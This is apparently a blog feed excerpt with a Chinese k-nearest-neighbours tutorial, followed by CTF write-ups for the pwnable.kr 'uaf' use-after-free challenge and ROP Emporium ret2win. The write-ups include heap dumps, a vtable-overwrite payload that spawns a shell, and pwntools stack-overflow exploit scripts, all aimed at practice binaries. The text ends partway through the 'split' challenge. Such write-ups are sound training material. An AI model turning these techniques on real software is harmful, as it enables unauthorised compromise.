    <content><![CDATA[<blockquote><p>K近邻算法：一种基本的分类算法</p></blockquote><h2><span id="pji-ben-nei-rong">基本内容</span><a href="#pji-ben-nei-rong" class="header-anchor">#</a></h2><p>输入：实例的特征向量</p><p>输出：实例的类别</p><p>思想：近朱者赤近墨者黑，对于输入实例x，选取距离x最近的K个点，x的分类结果就是K个点中数目最多的那个类别</p><p>三个要素：</p><ul><li>K的选择</li><li>距离的度量</li><li>分类决策规则</li></ul><p>优点：精度高、异常值不敏感、无数据输入假定</p><p>缺点：计算复杂度高、空间复杂度高</p><p>适用数据范围：数值型、标称型</p><a id="more"></a><h2><span id="pkai-fa-liu-cheng">开发流程</span><a href="#pkai-fa-liu-cheng" class="header-anchor">#</a></h2><ul><li>收集数据：任何方法</li><li>准备数据：距离计算所需要的数值，最好是结构化的数据格式</li><li>分析数据：任何方法</li><li>训练算法：此步骤不适用于 k-近邻算法</li><li>测试算法：计算错误率</li><li>使用算法：输入样本数据和结构化的输出结果，然后运行 k-近邻算法判断输入数据分类属于哪个分类，最后对计算出的分类执行后续处理</li></ul><h2><span id="pshi-zhan-xiang-mu">实战项目</span><a href="#pshi-zhan-xiang-mu" class="header-anchor">#</a></h2><ul><li>约会网站<a href="https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md" target="_blank" rel="noopener">https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md</a></li><li>手写数字识别<a href="https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md" target="_blank" rel="noopener">https://github.com/apachecn/AiLearning/blob/master/docs/ml/2.k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95.md</a></li></ul><p>注意点在于使用数据前一定要对数据进行归一化，否则数据范围差距过大，会引起很大问题</p><h2><span id="pgui-yi-hua-de-fang-fa">归一化的方法</span><a href="#pgui-yi-hua-de-fang-fa" class="header-anchor">#</a></h2><ul><li>线性函数转换：$y=(x-MinValue)/(MaxValue-MinValue)　　$</li><li>对数函数转换：$y=lg(x)　$ 是非线性转换，对x的取值范围有要求</li><li>反余切函数转换：$y=arctan(x)*2/PI　$，非线性转换，且对x的范围没有要求</li></ul><h2><span id="psan-yao-su">三要素</span><a href="#psan-yao-su" class="header-anchor">#</a></h2><h3><span id="pk-de-qu-zhi">K的取值</span><a href="#pk-de-qu-zhi" class="header-anchor">#</a></h3><ul><li>K小时，近似误差小，估计误差大；K大时，近似误差大，估计误差小</li><li>K小时，相当于用较小邻域中的训练实例进行预测，学习的近似误差会小，只有与输入实例相近的训练集样本才会对结果又影响。但缺点是学习误差会增大，如果恰好有噪声，则可能会出错。因此，K减小容易发生过拟合</li><li>K大时，与上面相反</li><li>可以使用交叉验证选取合适的K值</li></ul><p>PS:</p><ul><li>近似误差：可以理解为对现有训练集的训练误差。</li><li>估计误差：可以理解为对测试集的测试误差。</li></ul><h3><span id="pju-chi-du-liang">距离度量</span><a href="#pju-chi-du-liang" class="header-anchor">#</a></h3><p>通常是用欧氏距离，也可以是曼哈顿距离等</p><h3><span id="pfen-lei-jue-ce">分类决策</span><a href="#pfen-lei-jue-ce" class="header-anchor">#</a></h3><p>少数服从多数</p><h2><span id="phe-xin-suan-fa">核心算法</span><a href="#phe-xin-suan-fa" class="header-anchor">#</a></h2><ul><li>暴力计算（Brute Force）</li><li>二叉树平分参数空间（KD Tree）</li><li>超球体平分训练数据 (Ball Tree)</li></ul><p>具体可以看sklean文档 <a href="https://github.com/apachecn/sklearn-doc-zh/blob/master/docs/master/7.md" target="_blank" rel="noopener">https://github.com/apachecn/sklearn-doc-zh/blob/master/docs/master/7.md</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">clf = neighbors.KNeighborsClassifier(k, weights=<span class="string">'uniform'</span>) <span class="comment"># weights选用uniform是所有维度数据权重一致</span></span><br><span class="line">clf.fit(trainingMat, trainLabels)</span><br><span class="line">pridects = clf.predict(testMat)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>AI</category>
        <category>machine_learning</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>machine learning</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— uaf</title>
    <url>/23b2d439.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy, what is Use After Free bug?</span><br><span class="line"></span><br><span class="line">ssh uaf@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh uaf@pwnable.kr -p2222</code>，密码是cmd1的flag,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="puaf-cpp">uaf.cpp</span><a href="#puaf-cpp" class="header-anchor">#</a></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	<span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">	Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> len;</span><br><span class="line">	<span class="keyword">char</span>* data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(op)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				m-&gt;introduce();</span><br><span class="line">				w-&gt;introduce();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">				data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">				<span class="built_in">read</span>(<span class="built_in">open</span>(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="keyword">delete</span> m;</span><br><span class="line">				<span class="keyword">delete</span> w;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>先把文件下载下来<code>scp -P 2222 -p uaf@pwnable.kr:/home/uaf/* ./</code></p><h3><span id="pshen-qing-kuai-da-xiao">申请块大小</span><a href="#pshen-qing-kuai-da-xiao" class="header-anchor">#</a></h3><p>在main函数中可以看到以下两段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400efb:	bf 18 00 00 00       	mov    $0x18,%edi</span><br><span class="line">400f00:	e8 8b fe ff ff       	callq  400d90 &lt;_Znwm@plt&gt;</span><br><span class="line"></span><br><span class="line">400f59:	bf 18 00 00 00       	mov    $0x18,%edi</span><br><span class="line">400f5e:	e8 2d fe ff ff       	callq  400d90 &lt;_Znwm@plt&gt;</span><br></pre></td></tr></table></figure><p>都是申请了一个Fastbin块用于初始化man和woman对象<br>其中函数_Znwm可以用工具c++filt查看真实的函数名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@5c619b760e10:&#x2F;ctf&#x2F;work# c++filt _Znwm</span><br><span class="line">operator new(unsigned long)</span><br></pre></td></tr></table></figure><p>由于我们要利用UAF漏洞，所以再次申请时，也需要申请一样大小的Fastbin块，所以在选择2时，我们填入大小为24。由于Fastbin是LIFO，所以我们2申请块时，第一次申请得到的是原先属于w的块，第二次申请得到的是原先属于m的块。</p><h3><span id="pdui-xiang-jie-gou">对象结构</span><a href="#pdui-xiang-jie-gou" class="header-anchor">#</a></h3><p>在while(1)处打断点，然后可以查看到fastbin信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x614e60 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x0,</span><br><span class="line">  mchunk_size &#x3D; 0x31,</span><br><span class="line">  fd &#x3D; 0x4,</span><br><span class="line">  bk &#x3D; 0x4,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x6b63614a</span><br><span class="line">&#125;</span><br><span class="line">0x614e90 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x0,</span><br><span class="line">  mchunk_size &#x3D; 0x21,</span><br><span class="line">  fd &#x3D; 0x401570 &lt;vtable for Man+16&gt;,</span><br><span class="line">  bk &#x3D; 0x19,</span><br><span class="line">  fd_nextsize &#x3D; 0x614e88,</span><br><span class="line">  bk_nextsize &#x3D; 0x31</span><br><span class="line">&#125;</span><br><span class="line">0x614eb0 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x614e88,</span><br><span class="line">  mchunk_size &#x3D; 0x31,</span><br><span class="line">  fd &#x3D; 0x4,</span><br><span class="line">  bk &#x3D; 0x4,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x6c6c694a</span><br><span class="line">&#125;</span><br><span class="line">0x614ee0 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size &#x3D; 0x0,</span><br><span class="line">  mchunk_size &#x3D; 0x21,</span><br><span class="line">  fd &#x3D; 0x401550 &lt;vtable for Woman+16&gt;,</span><br><span class="line">  bk &#x3D; 0x15,</span><br><span class="line">  fd_nextsize &#x3D; 0x614ed8,</span><br><span class="line">  bk_nextsize &#x3D; 0x411</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以其中的块0x614e90为例，是m的结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10x 0x614e90</span><br><span class="line">0x614e90:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x614ea0:	0x0000000000401570	0x0000000000000019</span><br><span class="line">0x614eb0:	0x0000000000614e88	0x0000000000000031</span><br><span class="line">0x614ec0:	0x0000000000000004	0x0000000000000004</span><br><span class="line">0x614ed0:	0x0000000000000000	0x000000006c6c694a</span><br><span class="line">gdb-peda$ x&#x2F;10a 0x401570</span><br><span class="line">0x401570 &lt;vtable for Man+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x4012d2 &lt;Man::introduce()&gt;</span><br><span class="line">0x401580 &lt;vtable for Human&gt;:	0x0	0x4015f0 &lt;typeinfo for Human&gt;</span><br><span class="line">0x401590 &lt;vtable for Human+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x401192 &lt;Human::introduce()&gt;</span><br><span class="line">0x4015a0 &lt;typeinfo name for Woman&gt;:	0x6e616d6f5735	0x0</span><br><span class="line">0x4015b0 &lt;typeinfo for Woman&gt;:	0x602390 &lt;vtable for __cxxabiv1::__si_class_type_info@@CXXABI_1.3+16&gt;	0x4015a0 &lt;typeinfo name for Woman&gt;</span><br><span class="line">gdb-peda$ x&#x2F;s 0x614e88</span><br><span class="line">0x614e88:	&quot;Jack&quot;</span><br></pre></td></tr></table></figure><p>0x401570是Man的虚表，0x19是年龄25岁，0x614e88指向字符串&quot;Jack&quot;<br>也可以查看到w的结构</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10x 0x614ee0</span><br><span class="line">0x614ee0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x614ef0:	0x0000000000401550	0x0000000000000015</span><br><span class="line">0x614f00:	0x0000000000614ed8	0x0000000000000411</span><br><span class="line">0x614f10:	0x0a65657266202e33	0x000000000000000a</span><br><span class="line">0x614f20:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gdb-peda$ x&#x2F;10a 0x401550</span><br><span class="line">0x401550 &lt;vtable for Woman+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x401376 &lt;Woman::introduce()&gt;</span><br><span class="line">0x401560 &lt;vtable for Man&gt;:	0x0	0x4015d0 &lt;typeinfo for Man&gt;</span><br><span class="line">0x401570 &lt;vtable for Man+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x4012d2 &lt;Man::introduce()&gt;</span><br><span class="line">0x401580 &lt;vtable for Human&gt;:	0x0	0x4015f0 &lt;typeinfo for Human&gt;</span><br><span class="line">0x401590 &lt;vtable for Human+16&gt;:	0x40117a &lt;Human::give_shell()&gt;	0x401192 &lt;Human::introduce()&gt;</span><br><span class="line">gdb-peda$ x&#x2F;s 0x614ed8</span><br><span class="line">0x614ed8:	&quot;Jill&quot;</span><br></pre></td></tr></table></figure><h3><span id="pxu-biao">虚表</span><a href="#pxu-biao" class="header-anchor">#</a></h3><p>当存在虚函数的继承时，会出现虚表vtable，用来索引函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Man:                       0x401570</span><br><span class="line"> ---------------          -------------</span><br><span class="line">|+0 | vtable_Man| -----&gt; |+0 give_shell |</span><br><span class="line"> ---------------          -------------</span><br><span class="line">|+8 | age       |        |+8 introduce |</span><br><span class="line"> ---------------          -------------</span><br><span class="line">|+16| name      |</span><br><span class="line"> ---------------</span><br></pre></td></tr></table></figure><p>本来调用m的introduce函数时，是<code>*(vtable_man+8)</code>，这里<code>vtable_man</code>是我们可以通过文件写入的值，为了调用到<code>give_shell</code>函数，我们只要将文件内容改成<code>(vtable_man-8)</code>的值代替原来的<code>vtable_man</code>即可</p><p>注意到这里有三个虚表，Man的，Woman的以及Human的，任意选一个即可，比如我选<code>(0x401670-8)</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uaf@pwnable:~$ python -c &quot;print &#39;\x68\x15\x40\x00\x00\x00\x00\x00&#39;&quot; &gt; &#x2F;tmp&#x2F;tmpfile</span><br><span class="line">uaf@pwnable:~$ .&#x2F;uaf 24 &#x2F;tmp&#x2F;tmpfile</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">3</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">2</span><br><span class="line">your data is allocated</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">2</span><br><span class="line">your data is allocated</span><br><span class="line">1. use</span><br><span class="line">2. after</span><br><span class="line">3. free</span><br><span class="line">1</span><br><span class="line">$ ls</span><br><span class="line">flag  uaf  uaf.cpp</span><br><span class="line">$ cat flag</span><br><span class="line">yay_f1ag_aft3r_pwning</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>yay_f1ag_aft3r_pwning</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP Emporium (上)</title>
    <url>/ad24c8c9.html</url>
    <content><![CDATA[<p><strong>注意</strong>：64位传参前六个参数使用寄存器RDI、RSI、RDX、RCX、R8、R9</p><a id="more"></a><h2><span id="pret2win">ret2win</span><a href="#pret2win" class="header-anchor">#</a></h2><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><p>先查看一些基本信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ checksec ret2win32 </span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/ret2win32/ret2win32'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ rabin2 -qs ret2win32 | grep -ve imp -e ' 0 '</span><br><span class="line">0x00002068 1 completed.7200</span><br><span class="line">0x000005f6 99 pwnme</span><br><span class="line">0x00000659 41 ret2win</span><br><span class="line">0x000006f0 2 __libc_csu_fini</span><br><span class="line">0x000004b0 4 __x86.get_pc_thunk.bx</span><br><span class="line">0x00002040 4 stderrGLIBC_2.0</span><br><span class="line">0x0000070c 4 _IO_stdin_used</span><br><span class="line">0x00000690 93 __libc_csu_init</span><br><span class="line">0x00002060 4 stdinGLIBC_2.0</span><br><span class="line">0x00000708 4 _fp_hw</span><br><span class="line">0x00002064 4 stdoutGLIBC_2.0</span><br><span class="line">0x0000057b 123 main</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win32$ rabin2 -z ret2win32 </span><br><span class="line">[strings]</span><br><span class="line">addr=0x08048710 off=0x00000710 ordinal=000 sz=24 section=.rodata string=ret2win by ROP Emporium</span><br><span class="line">addr=0x08048728 off=0x00000728 ordinal=001 sz=7 section=.rodata string=32bits</span><br><span class="line">addr=0x08048731 off=0x00000731 ordinal=002 sz=8 section=.rodata string=Exiting</span><br><span class="line">addr=0x0804873c off=0x0000073c ordinal=003 sz=96 section=.rodata string=For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;</span><br><span class="line">addr=0x0804879c off=0x0000079c ordinal=004 sz=30 section=.rodata string=What could possibly go wrong?</span><br><span class="line">addr=0x080487bc off=0x000007bc ordinal=005 sz=100 section=.rodata string=You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!</span><br><span class="line">addr=0x08048821 off=0x00000821 ordinal=006 sz=3 section=.rodata string=&gt; </span><br><span class="line">addr=0x08048824 off=0x00000824 ordinal=007 sz=29 section=.rodata string=Thank you! Here's your flag:</span><br><span class="line">addr=0x08048841 off=0x00000841 ordinal=008 sz=18 section=.rodata string=/bin/cat flag.txt</span><br></pre></td></tr></table></figure><p>看到有函数<code>pwnme</code>,<code>ret2win</code>,同时也有字符串<code>/bin/cat flag.txt</code>。<br>再用IDA看下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ret2win by ROP Emporium"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"32bits\n"</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nExiting"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n"</span></span><br><span class="line">    <span class="string">"What could possibly go wrong?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Thank you! Here's your flag:"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/cat flag.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本很明白了，利用pwnme中的s栈溢出跳转到ret2win部分即可</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">ret_addr = <span class="number">0x8048659</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(ret_addr)</span><br><span class="line">p = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者直接<code>python -c &quot;print 'a'*(0x28+4)+'\x59\x86\x04\x08'&quot; | ./ret2win32</code></p><h3><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/ret2win$ checksec ret2win</span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/ret2win/ret2win'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>和32没什么区别，IDA看下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  puts(&quot;ret2win by ROP Emporium&quot;);</span><br><span class="line">  puts(&quot;64bits\n&quot;);</span><br><span class="line">  pwnme();</span><br><span class="line">  puts(&quot;\nExiting&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">char *pwnme()</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-20h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x20uLL);</span><br><span class="line">  puts(</span><br><span class="line">    &quot;For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n&quot;</span><br><span class="line">    &quot;What could possibly go wrong?&quot;);</span><br><span class="line">  puts(&quot;You there madam, may I have your input please? And don&#39;t worry about null bytes, we&#39;re using fgets!\n&quot;);</span><br><span class="line">  printf(&quot;&gt; &quot;, 0LL);</span><br><span class="line">  return fgets(&amp;s, 50, stdin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">int ret2win()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Thank you! Here&#39;s your flag:&quot;);</span><br><span class="line">  return system(&quot;&#x2F;bin&#x2F;cat flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于没有其余参数，所以无差</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">ret_addr = <span class="number">0x400811</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(ret_addr)</span><br><span class="line">p = process(<span class="string">'./ret2win'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="psplit">split</span><a href="#psplit" class="header-anchor">#</a></h2><h3><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ checksec split32</span><br><span class="line">[*] '/home/ubuntu/rop_emporium_all_challenges/split/split32'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">ubuntu@VM-0-3-ubuntu:~/rop_emporium_all_challenges/split$ rabin2 -z split32</span><br><span class="line">[strings]</span><br><span class="line">addr=0x080486f0 off=0x000006f0 ordinal=000 sz=22 section=.rodata string=split by ROP Emporium</span><br><span class="line">addr=0x08048706 off=0x00000706 ordinal=001 sz=7 section=.rodata string=32bits</span><br><span 